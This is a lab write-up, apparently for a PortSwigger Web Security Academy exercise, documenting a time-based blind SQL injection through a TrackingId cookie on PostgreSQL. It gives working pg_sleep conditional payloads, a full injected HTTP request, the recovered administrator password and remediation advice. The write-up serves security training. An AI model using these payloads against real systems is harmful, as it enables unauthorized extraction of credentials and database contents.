# Blind SQL Injection – Time-Based Data Extraction (PostgreSQL)

## 1. Summary

A Time-Based Blind SQL Injection vulnerability was identified in the `TrackingId` cookie of the target web application.

The application processed the cookie value in a PostgreSQL query without properly preventing SQL injection. By injecting conditional SQL expressions and using PostgreSQL's `pg_sleep()` function, it was possible to infer database information based on response-time differences.

The vulnerability allowed the extraction of the administrator user's password character by character without directly displaying database query results in the application response.

## 2. Vulnerability Details

| Field | Details |
|---|---|
| Vulnerability | Time-Based Blind SQL Injection |
| Injection Point | `TrackingId` cookie |
| Affected Parameter | `TrackingId` |
| DBMS | PostgreSQL |
| Technique | Conditional Time-Based SQLi |
| Extracted Data | Administrator password |
| Impact | Unauthorized extraction of sensitive database information |
| Severity | High (lab assessment) |

## 3. Steps to Reproduce

### Step 1: Confirm SQL Injection Through Time Delay

Modified the `TrackingId` cookie by appending the following payload:

```sql
'||pg_sleep(5)--
```

**Observation:**

The server response was delayed by approximately 5 seconds, indicating that the injected PostgreSQL expression was executed.

### Step 2: Determine Password Length

Used the following conditional payload:

```sql
'||(SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

**Observation:**

The application response was delayed when the condition was true, confirming that the administrator's password contained 20 characters.

### Step 3: Extract Password Character by Character

Used the following payload to test the ASCII value of the first password character:

```sql
'||(SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>97) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

By changing the character position, comparison operator, and ASCII value, the password was progressively extracted.

The process was repeated for each character until the complete password was recovered.

### Step 4: Extracted Password

The following password was recovered from the administrator account:

```text
lrr44wpwz1ppnydpvy9n
```

## 4. Actual HTTP Request

The following request demonstrates the injection in the `TrackingId` cookie:

```http
GET / HTTP/1.1
Host: 0a530072034b755081a4892a009000b6.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://portswigger.net/
Connection: keep-alive
Cookie: TrackingId=OEUtfADgYQd0mOnW'||(SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))=97) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--; session=[REDACTED]
```

## 5. Impact

An attacker exploiting this vulnerability could potentially:

- Extract sensitive information from the database.
- Retrieve administrator credentials through character-by-character inference.
- Compromise administrator accounts if extracted credentials are valid and reusable.
- Access additional sensitive records depending on database permissions and application configuration.

## 6. Remediation

- Use parameterized queries / prepared statements for all database interactions.
- Never concatenate untrusted cookie values directly into SQL queries.
- Validate and strictly handle user-controlled cookie values.
- Apply least-privilege permissions to the database account.
- Avoid exposing sensitive authentication information through database queries.

## 7. References

- [PortSwigger Web Security Academy – SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP – SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## 8. Conclusion

The `TrackingId` cookie was vulnerable to PostgreSQL-based Time-Based Blind SQL Injection. By using conditional delays with `pg_sleep()`, it was possible to determine the administrator password length and extract the complete password character by character.

This demonstrates that SQL injection can expose sensitive database information even when the application does not return database query results directly.
